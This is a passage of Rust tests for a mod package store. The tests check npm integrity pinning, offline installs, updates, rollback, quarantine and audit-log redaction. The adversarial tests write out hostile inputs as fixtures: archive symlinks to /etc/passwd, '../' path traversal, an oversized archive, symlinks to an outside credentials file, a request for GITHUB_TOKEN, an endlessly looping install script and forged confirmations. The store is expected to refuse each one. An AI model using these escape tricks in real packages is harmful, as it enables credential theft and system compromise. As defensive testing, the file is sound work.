                "npm_mod".into(),
                ModPackageGrant {
                    capabilities: capabilities.iter().map(|value| value.to_string()).collect(),
                    ..ModPackageGrant::default()
                },
            )]),
        },
        settings: BTreeMap::new(),
        ..request(Path::new("/npm_mod"), &[])
    }
}

fn refusal(store: &ModStore, request: ModInstallRequest) -> String {
    store.package_plan(request).unwrap_err().to_string()
}

#[test]
fn npm_packages_resolve_exact_verified_versions_and_reinstall_offline() {
    let temp = TempDir::new().unwrap();
    let store = store(&temp);
    let (origin, routes) = registry();
    publish(
        &origin,
        &routes,
        &[
            ("1.0.0", npm_archive("1.0.0", &["commands"])),
            ("1.1.0", npm_archive("1.1.0", &["commands"])),
            ("2.0.0", npm_archive("2.0.0", &["commands"])),
        ],
    );
    let install = npm_request(&origin, "^1.0.0", &["commands"]);
    let plan = store.package_plan(install.clone()).unwrap();
    let pinned = ModPackageSource::Npm {
        package: "@fixture/omd-npm".into(),
        version: "1.1.0".into(),
        registry: origin.clone(),
        integrity: sri(&npm_archive("1.1.0", &["commands"])),
    };
    assert_eq!(plan.packages[0].source, pinned);
    assert_eq!(plan.packages[0].version, "1.1.0");
    let lock = store.package_apply(install, &plan.confirmation).unwrap();
    assert!(!lock.packages["npm_mod"].enabled);
    assert!(
        lock.packages["npm_mod"].path.starts_with(
            temp.path()
                .canonicalize()
                .unwrap()
                .join("store/package-cache")
        )
    );
    assert_eq!(
        store
            .package_plan(npm_request(&origin, "", &["commands"]))
            .unwrap()
            .packages[0]
            .version,
        "2.0.0",
        "no selector follows the latest tag"
    );

    routes.lock().unwrap().clear();
    let mut offline = npm_request(&origin, "1.1.0", &["commands"]);
    offline.offline = true;
    assert_eq!(
        store.package_plan(offline).unwrap().packages[0].integrity,
        lock.packages["npm_mod"].integrity
    );
    let mut missing = npm_request(&origin, "2.0.0", &["commands"]);
    missing.offline = true;
    assert!(refusal(&store, missing).contains("npm_package_unavailable_offline_and_not_cached"));
    assert!(
        refusal(&store, npm_request(&origin, "^1.0.0", &["commands"])).contains("npm_fetch_failed")
    );

    store.package_enable("npm_mod").unwrap();
    publish(
        &origin,
        &routes,
        &[
            ("1.1.0", npm_archive("1.1.0", &["commands"])),
            ("1.2.0", npm_archive("1.2.0", &["commands"])),
        ],
    );
    let update = ModInstallRequest {
        source: lock.packages["npm_mod"].source.updatable(),
        ..npm_request(&origin, "", &["commands"])
    };
    let plan = store.package_plan(update.clone()).unwrap();
    assert_eq!(plan.action, "update");
    assert_eq!(plan.packages[0].version, "1.2.0");
    assert_eq!(plan.changes["packages"][0]["renewed_approval"], false);
    let lock = store.package_apply(update, &plan.confirmation).unwrap();
    assert!(
        lock.packages["npm_mod"].enabled,
        "an unchanged grant stays on"
    );
    let rollback = store.package_rollback_plan("npm_mod").unwrap();
    let lock = store
        .package_rollback("npm_mod", &rollback.confirmation)
        .unwrap();
    assert_eq!(lock.packages["npm_mod"].version, "1.1.0");
}

#[test]
fn hostile_npm_archives_and_registry_substitution_are_refused() {
    let temp = TempDir::new().unwrap();
    let store = store(&temp);
    let (origin, routes) = registry();
    let honest = npm_archive("1.0.0", &["commands"]);
    publish(&origin, &routes, &[("1.0.0", honest.clone())]);
    let mut pinned = npm_request(&origin, "1.0.0", &["commands"]);
    let plan = store.package_plan(pinned.clone()).unwrap();
    pinned.source = plan.packages[0].source.clone();

    routes.lock().unwrap().insert(
        "/tarballs/omd-npm-1.0.0.tgz".into(),
        npm_archive("1.0.0", &["commands", "exec"]),
    );
    assert!(
        refusal(&store, npm_request(&origin, "1.0.0", &["commands"]))
            .contains("npm_tarball_integrity_failure")
    );

    publish(
        &origin,
        &routes,
        &[("1.0.0", npm_archive("1.0.0", &["commands", "exec"]))],
    );
    assert!(refusal(&store, pinned).contains("npm_integrity_changed"));
    assert!(
        refusal(&store, npm_request(&origin, "1.0.0", &["commands"]))
            .contains("explicit_exact_capability_grant_required"),
        "a republished permission change needs a new grant"
    );

    let mut files = npm_mod("1.0.0", &["commands"]);
    let entries = |files: &[(String, Vec<u8>)], extra: &[(&str, u8, &[u8])]| {
        let mut entries = files
            .iter()
            .map(|(name, data)| (name.as_str(), b'0', data.as_slice()))
            .collect::<Vec<_>>();
        entries.extend_from_slice(extra);
        publish(&origin, &routes, &[("1.0.0", tarball(&entries))]);
        refusal(&store, npm_request(&origin, "1.0.0", &["commands"]))
    };
    assert!(
        entries(&files, &[("package/escape.ts", b'2', b"/etc/passwd")])
            .contains("npm_archive_link_rejected")
    );
    assert!(
        entries(&files, &[("package/../escape.ts", b'0', b"x")])
            .contains("npm_archive_path_rejected")
    );
    let bomb = vec![0; 17 * 1024 * 1024];
    assert!(
        entries(&files, &[("package/bomb.ts", b'0', &bomb)])
            .contains("npm_archive_invalid: larger than")
    );
    let mut seed = 1u64;
    let noise = (0..5 * 1024 * 1024)
        .map(|_| {
            seed = seed
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            (seed >> 56) as u8
        })
        .collect::<Vec<_>>();
    assert!(
        entries(&files, &[("package/noise.ts", b'0', &noise)])
            .contains("npm_fetch_failed: larger than")
    );
    files[0].1 = serde_json::to_vec(&json!({"name":"@fixture/omd-npm","version":"1.0.0",
        "dependencies":{"left-pad":"1.3.0"}}))
    .unwrap();
    assert!(entries(&files, &[]).contains("npm_runtime_dependencies_unsupported"));
    files[0].1 = serde_json::to_vec(&json!({"name":"@fixture/other","version":"1.0.0"})).unwrap();
    assert!(entries(&files, &[]).contains("npm_package_identity_mismatch"));
    let without_manifest = npm_mod("1.0.0", &["commands"])
        .into_iter()
        .filter(|(name, _)| name != "package/mod.json")
        .collect::<Vec<_>>();
    assert!(entries(&without_manifest, &[]).contains("npm_mod_manifest_missing"));

    for (package, registry) in [
        ("../omd", origin.as_str()),
        ("@fixture/omd-npm", "http://registry.example.com"),
        ("@fixture/omd-npm", "file:///etc"),
    ] {
        let mut request = npm_request(registry, "1.0.0", &["commands"]);
        request.source = ModPackageSource::Npm {
            package: package.into(),
            version: "1.0.0".into(),
            registry: registry.into(),
            integrity: String::new(),
        };
        assert!(refusal(&store, request).contains("npm_reference_invalid"));
    }
    assert!(
        std::fs::read_dir(temp.path().join("store"))
            .unwrap()
            .all(|entry| !entry
                .unwrap()
                .file_name()
                .to_string_lossy()
                .ends_with(".tmp")),
        "refused archives leave no staging directory"
    );
}

#[test]
fn adversarial_local_packages_cannot_escape_escalate_or_forge_approval() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let store = store_with_node(&temp);
    let package = mod_package(&root, "hostile", "1.0.0", &["commands"], json!([]));
    let manifest = |change: &dyn Fn(&mut serde_json::Value)| {
        let mut value: serde_json::Value =
            serde_json::from_slice(&std::fs::read(package.join("mod.json")).unwrap()).unwrap();
        change(&mut value);
        std::fs::write(
            package.join("mod.json"),
            serde_json::to_vec(&value).unwrap(),
        )
        .unwrap();
    };

    let outside = root.join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("credentials.json"), b"{\"token\":\"secret\"}").unwrap();
    std::os::unix::fs::symlink(&outside, package.join("lib")).unwrap();
    manifest(&|value| value["assets"] = json!(["lib/credentials.json"]));
    assert!(refusal(&store, request(&package, &["commands"])).contains("package_path_escape"));
    manifest(&|value| value["assets"] = json!([]));
    std::fs::remove_file(package.join("main.ts")).unwrap();
    std::os::unix::fs::symlink(outside.join("credentials.json"), package.join("main.ts")).unwrap();
    assert!(
        store
            .package_plan(request(&package, &["commands"]))
            .is_err()
    );
    std::fs::remove_file(package.join("main.ts")).unwrap();
    std::fs::write(package.join("main.ts"), "export default () => {}\n").unwrap();

    manifest(&|value| {
        value["exec_environment"] = json!(["GITHUB_TOKEN"]);
        value["capabilities"] = json!(["commands", "exec"]);
    });
    assert!(
        refusal(&store, request(&package, &["commands", "exec"]))
            .contains("secret_environment_requires_explicit_trust: hostile GITHUB_TOKEN")
    );
    manifest(&|value| {
        value["exec_environment"] = json!([]);
        value["capabilities"] = json!(["commands"]);
        value["entrypoint"] = json!("big.ts");
    });
    std::fs::write(package.join("big.ts"), vec![b'/'; 524_288]).unwrap();
    assert!(ModStore::inspect_package(&package).is_ok());
    std::fs::write(package.join("big.ts"), vec![b'/'; 524_289]).unwrap();
    assert!(
        refusal(&store, request(&package, &["commands"]))
            .contains("file_limit: big.ts exceeds 524288 bytes")
    );
    std::fs::remove_file(package.join("big.ts")).unwrap();
    std::fs::create_dir(package.join("big.ts")).unwrap();
    assert!(refusal(&store, request(&package, &["commands"])).contains("regular_file_required"));
    std::fs::remove_dir(package.join("big.ts")).unwrap();
    manifest(&|value| {
        value["entrypoint"] = json!("main.ts");
        value["lifecycle"] = json!({"install":"install.ts"});
    });
    std::fs::write(
        package.join("install.ts"),
        "export default () => { for (;;) {} }\n",
    )
    .unwrap();
    let mut looping = request(&package, &["commands"]);
    looping.trust.packages.get_mut("hostile").unwrap().lifecycle = vec!["install".into()];
    let plan = store.package_plan(looping.clone()).unwrap();
    assert!(store.package_apply(looping, &plan.confirmation).is_err());
    assert!(
        store.package_lock().unwrap().packages.is_empty(),
        "a runaway script installs nothing"
    );
    manifest(&|value| value["lifecycle"] = json!({}));

    let install = request(&package, &["commands"]);
    let plan = store.package_plan(install.clone()).unwrap();
    assert!(
        store
            .package_apply(install.clone(), &"0".repeat(64))
            .unwrap_err()
            .to_string()
            .contains("package_plan_changed"),
        "a forged confirmation is refused"
    );
    std::fs::write(
        package.join("main.ts"),
        "export default () => { /* swapped */ }\n",
    )
    .unwrap();
    assert!(
        store
            .package_apply(install.clone(), &plan.confirmation)
            .unwrap_err()
            .to_string()
            .contains("package_plan_changed"),
        "content changed after review is refused"
    );
    let plan = store.package_plan(install.clone()).unwrap();
    store.package_apply(install, &plan.confirmation).unwrap();
    store.package_enable("hostile").unwrap();
    assert!(
        store
            .trust(
                package.clone(),
                &"0".repeat(64),
                vec!["commands".into()],
                "user"
            )
            .unwrap_err()
            .to_string()
            .contains("trust_digest_mismatch")
    );

    manifest(&|value| {
        value["version"] = json!("1.1.0");
        value["capabilities"] = json!(["commands", "exec"]);
    });
    assert!(
        refusal(&store, request(&package, &["commands"]))
            .contains("explicit_exact_capability_grant_required")
    );
    let escalation = request(&package, &["commands", "exec"]);
    let plan = store.package_plan(escalation.clone()).unwrap();
    assert_eq!(plan.changes["packages"][0]["renewed_approval"], true);
    assert_eq!(
        plan.changes["packages"][0]["grant"]["from"]["capabilities"],
        json!(["commands"])
    );
    let lock = store.package_apply(escalation, &plan.confirmation).unwrap();
    assert!(
        !lock.packages["hostile"].enabled,
        "new authority is never enabled by an update"
    );

    let cache = lock.history["hostile"][0].cache_path.clone();
    std::fs::write(
        cache.join("main.ts"),
        "export default () => { /* tampered */ }\n",
    )
    .unwrap();
    let rollback = store.package_rollback_plan("hostile").unwrap();
    assert!(
        store
            .package_rollback("hostile", &rollback.confirmation)
            .unwrap_err()
            .to_string()
            .contains("cached_package_integrity_failure")
    );

    store
        .package_quarantine("hostile", "exfiltrates tokens")
        .unwrap();
    assert!(
        store
            .package_enable("hostile")
            .unwrap_err()
            .to_string()
            .contains("package_blocked")
    );
    assert!(
        refusal(&store, request(&package, &["commands", "exec"]))
            .contains("package_blocked: hostile 1.1.0: exfiltrates tokens")
    );
    assert!(store.package_quarantine("hostile", "two\nlines").is_err());
    let blocked = store.package_lock().unwrap();
    assert!(!blocked.packages["hostile"].enabled);
    assert!(
        root.join("hostile/main.ts").exists(),
        "quarantine keeps user data and sources"
    );
    store.package_unblock("hostile").unwrap();
    store.package_enable("hostile").unwrap();

    store.revoke("hostile").unwrap();
    let lock = store.package_lock().unwrap();
    assert!(
        !lock.packages["hostile"].enabled && lock.packages["hostile"].trust.capabilities.is_empty()
    );
    assert!(
        store
            .package_enable("hostile")
            .unwrap_err()
            .to_string()
            .contains("capability_denied")
    );
    let uninstall = store.package_uninstall_plan("hostile").unwrap();
    store
        .package_uninstall("hostile", &uninstall.confirmation)
        .unwrap();

    let leaked = ModInstallRequest {
        source: ModPackageSource::Repository {
            repository: "https://user:ghp_secret@example.invalid/mod.git?token=abc".into(),
            revision: "main".into(),
            subdirectory: String::new(),
        },
        offline: true,
        ..request(&package, &["commands"])
    };
    assert!(store.package_apply(leaked, "x").is_err());
    let events = store.security_events().unwrap();
    let kinds = events
        .iter()
        .map(|event| event["event"].as_str().unwrap())
        .collect::<Vec<_>>();
    for kind in [
        "install",
        "enable",
        "update",
        "quarantine",
        "unblock",
        "revoke",
        "uninstall",
        "package_refused",
    ] {
        assert!(kinds.contains(&kind), "{kind} missing from {kinds:?}");
    }
    let text = serde_json::to_string(&events).unwrap();
    assert!(!text.contains("ghp_secret") && !text.contains("token=abc"));
    assert!(text.contains("https://example.invalid/mod.git"));
}

fn edit_manifest(package: &Path, edit: impl FnOnce(&mut serde_json::Value)) {
    let path = package.join("mod.json");
    let mut manifest: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    edit(&mut manifest);
    std::fs::write(path, serde_json::to_vec_pretty(&manifest).unwrap()).unwrap();
}

fn install(store: &ModStore, request: ModInstallRequest) -> codex_omd::ModPackageLock {
    let plan = store.package_plan(request.clone()).unwrap();
    store.package_apply(request, &plan.confirmation).unwrap()
}

#[test]
fn an_update_keeps_activation_only_when_every_approval_input_is_unchanged() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let package = mod_package(&root, "fixture", "1.0.0", &["exec"], json!([]));
    let store = store(&temp);
    install(&store, request(&package, &["exec"]));
    store.package_enable("fixture").unwrap();

    edit_manifest(&package, |manifest| manifest["version"] = json!("1.0.1"));
    let plan = store.package_plan(request(&package, &["exec"])).unwrap();
    assert_eq!(plan.changes["packages"][0]["renewed_approval"], false);
    assert_eq!(plan.changes["packages"][0]["activation"]["to"], true);

    edit_manifest(&package, |manifest| {
        manifest["version"] = json!("1.1.0");
        manifest["exec_environment"] = json!(["FIXTURE_VALUE"]);
    });
    let plan = store.package_plan(request(&package, &["exec"])).unwrap();
    assert_eq!(plan.changes["packages"][0]["renewed_approval"], true);
    assert_eq!(plan.changes["packages"][0]["activation"]["to"], false);
    let lock = store
        .package_apply(request(&package, &["exec"]), &plan.confirmation)
        .unwrap();
    assert!(!lock.packages["fixture"].enabled);
    assert!(!store.configuration().unwrap().mods[0].enabled);
}

#[test]
fn package_requests_refuse_a_wrong_action_another_scope_and_nested_index_sources() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let package = mod_package(&root, "fixture", "1.0.0", &[], json!([]));
    let store = store(&temp);
    let mut wrong = request(&package, &[]);
    wrong.action = Some("update".into());
    let error = store.package_plan(wrong.clone()).unwrap_err().to_string();
    assert!(error.contains("package_plan_action_mismatch"), "{error}");
    let plan = store.package_plan(request(&package, &[])).unwrap();
    assert!(
        store
            .package_apply(wrong, &plan.confirmation)
            .unwrap_err()
            .to_string()
            .contains("package_plan_action_mismatch")
    );
    let mut install_request = request(&package, &[]);
    install_request.action = Some("install".into());
    install(&store, install_request.clone());
    let error = store.package_plan(install_request).unwrap_err().to_string();
    assert!(error.contains("package_plan_action_mismatch"), "{error}");

    let mut project = request(&package, &[]);
    project.scope = "project".into();
    let error = store.package_plan(project).unwrap_err().to_string();
    assert!(error.contains("package_scope_conflict"), "{error}");

    let index = root.join("index.json");
    std::fs::write(
        &index,
        serde_json::to_vec(&json!({"schema":1,"packages":{"nested":[{
            "version":"1.0.0",
            "source":{"kind":"package","index":index,"id":"nested","version":"1.0.0"},
            "integrity":"0".repeat(64)
        }]}}))
        .unwrap(),
    )
    .unwrap();
    let error = store
        .package_index_entries(&index, "", 0, 200)
        .unwrap_err()
        .to_string();
    assert!(error.contains("index_release_source_invalid"), "{error}");
}

#[test]
fn one_copy_of_a_mod_is_on_and_removing_the_package_keeps_the_bundled_copy() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let package = mod_package(&root, "fixture", "1.0.0", &["exec"], json!([]));
    let bundled = mod_package(
        &root.join("sources"),
        "fixture",
        "1.0.0",
        &["exec"],
        json!([]),
    );
    let store = store(&temp);
    install(&store, request(&package, &["exec"]));
    store.package_enable("fixture").unwrap();
    let sha256 = ModStore::inspect_package(&bundled).unwrap()["sha256"]
        .as_str()
        .unwrap()
        .to_owned();
    store
        .trust(bundled.clone(), &sha256, vec!["exec".into()], "user")
        .unwrap();
    let refused = store.enable(&bundled, true).unwrap_err().to_string();
    assert!(
        refused.contains("mod_conflict: fixture is already on"),
        "{refused}"
    );

    store.package_disable("fixture").unwrap();
    store.enable(&bundled, true).unwrap();
    let refused = store.package_enable("fixture").unwrap_err().to_string();
    assert!(
        refused.contains("mod_conflict: fixture is already on"),
        "{refused}"
    );

    let uninstall = store.package_uninstall_plan("fixture").unwrap();
    store
        .package_uninstall("fixture", &uninstall.confirmation)
        .unwrap();
    let mods = store.configuration().unwrap().mods;
    assert_eq!(mods.len(), 1);
    assert_eq!(mods[0].path, bundled);
    assert!(mods[0].enabled);
}

#[test]
fn a_store_written_by_1_0_0_is_read_and_its_node_entry_dropped() {
    let temp = TempDir::new().unwrap();
    let root = temp.path().canonicalize().unwrap();
    let store = store(&temp);
    let file = store.root().join("mods.json");
    let mut config: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
    config["node"] = json!("/opt/node/bin/node");
    std::fs::write(&file, serde_json::to_vec(&config).unwrap()).unwrap();
    let package = mod_package(&root, "fixture", "1.0.0", &[], json!([]));
    let sha256 = ModStore::inspect_package(&package).unwrap()["sha256"]
        .as_str()
        .unwrap()
        .to_owned();
    store
        .trust(package.clone(), &sha256, Vec::new(), "user")
        .unwrap();
    store.enable(&package, true).unwrap();
    let written: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
    assert!(written.get("node").is_none(), "{written}");
    assert_eq!(written["mods"][0]["enabled"], true);
}
